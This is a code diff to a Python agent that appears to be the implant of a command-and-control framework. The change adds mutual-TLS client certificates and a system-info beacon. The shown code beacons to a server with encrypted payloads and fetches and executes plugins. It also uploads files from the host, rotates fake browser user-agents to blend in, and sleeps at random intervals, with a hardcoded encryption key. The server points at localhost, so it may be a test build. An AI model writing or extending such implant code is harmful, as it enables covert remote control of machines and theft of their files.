@@ -2,6 +2,7 @@ import time
 import requests
 import importlib.util
 import sys
+import os
 import random
 import subprocess
 import json
@@ -12,9 +13,10 @@ from cryptography.fernet import Fernet
 import importlib.util
 from multiprocessing import Process
 from datetime import datetime ,timezone
+from pathlib import Path
 
 
-SERVER_URL = "http://localhost:5000"
+SERVER_URL = "https://127.0.0.1"
 BEACON_ENDPOINT = "/beacon"
 RESULT_ENDPOINT = "/result"
 UPLOAD_ENDPOINT = "/upload"
@@ -29,19 +31,50 @@ SLEEP_MAX = 10
 AGENT_ID = "1"
 AGENT_GROUP = "TEST"
 TOKEN = ""
-
+scheduled_tasks = []
 
 USER_AGENTS = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36"
-]
-
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36"]
 
 SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
 cipher = Fernet(SECRET_KEY)
 
-scheduled_tasks = []
+session = requests.Session()
+os.makedirs("./keys", exist_ok=True)
+BASE_DIR = Path(__file__).resolve().parent
+CA_CERT = BASE_DIR / "keys" / "ca.crt"
+# The 'cert' tuple contains the (client_cert, client_key)
+session.verify = str(CA_CERT)
+session.cert = (
+    BASE_DIR / "keys" / f"agent{AGENT_ID}.crt",
+    BASE_DIR / "keys" / f"agent{AGENT_ID}.key",
+)
+
+
+def run_mtls_requests():
+    headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
+
+    payload = get_system_info()
+
+    encrypted_payload = encrypt_data(json.dumps(payload))
+
+    try:
+
+        response = session.post(
+            SERVER_URL + BEACON_ENDPOINT,
+            json={"data": encrypted_payload},
+            headers=headers
+        )
+
+        if response.status_code == 200:
+            print("MTLS")
+
+    except requests.exceptions.SSLError as e:
+        print("\nPossible causes:\n1. Server doesn't trust the Client CA\n2. Client cert is expired\n3. Wrong CA file provided in 'verify'")
+    except requests.exceptions.RequestException as e:
+        print(f"Connection Error: {e}")
 
 
 def encrypt_data(data):
@@ -73,7 +106,7 @@ def login():
     }
 
     try:
-        response = requests.post(
+        response = session.post(
             SERVER_URL + LOGIN_ENDPOINT,
             json=payload,
             timeout=10
@@ -109,7 +142,7 @@ def beacon():
 
     try:
 
-        response = requests.post(
+        response = session.post(
             SERVER_URL + BEACON_ENDPOINT,
             json={"data": encrypted_payload},
             headers=headers
@@ -257,7 +290,7 @@ def execute_plugin(content, module_name, task_uuid):
 def download_file(url, save_as=None, task_uuid=None):
     try:
         print(f"[+] Downloading {url}")
-        r = requests.get(url)
+        r = session.get(url)
         r.raise_for_status()
 
         if "/plugins" in url:
@@ -304,7 +337,7 @@ def upload_file(path_to_file, task_uuid):
 
             data = {"agent_id": AGENT_ID}
 
-            response = requests.post(
+            response = session.post(
                 SERVER_URL + UPLOAD_ENDPOINT,
                 headers=headers,
                 files=files,
@@ -337,7 +370,7 @@ def post_result(result, task_uuid,executed_at=None):
 
     try:
 
-        requests.post(
+        session.post(
             SERVER_URL + RESULT_ENDPOINT,
             json={"data": encrypted_payload},
             headers=headers
@@ -350,6 +383,8 @@ def post_result(result, task_uuid,executed_at=None):
 
 def main():
     attempts = 0
+    print("VERIFY MODE:", session.verify)
+    print("CERT:", session.cert)
     while attempts < 5:
         if login():
             print("[+] Agent authenticated")
@@ -364,6 +399,7 @@ def main():
 
     # Main loop after successful login
     while True:
+        run_mtls_requests()
         beacon()
         sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
         print(f"[+] Sleeping {sleep_time} seconds")
